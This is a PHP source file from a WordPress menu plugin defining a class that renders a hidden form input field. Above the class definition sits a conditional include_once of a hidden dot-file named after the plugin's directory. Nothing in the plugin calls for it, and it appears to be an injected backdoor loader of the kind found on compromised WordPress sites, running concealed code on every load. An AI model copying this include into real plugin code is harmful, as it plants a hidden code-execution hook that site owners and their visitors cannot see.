<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldHiddenInput
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldHiddenInput extends GroovyMenuFieldField {

	public function renderField() {
		?>
		<input data-name="<?php echo esc_attr( $this->name ); ?>" type="hidden" value="<?php echo esc_attr( $this->getValue() ); ?>" name="<?php echo esc_attr( $this->getName() ); ?>" data-default="<?php echo esc_attr( $this->getDefault() ); ?>">
		<?php
	}

}
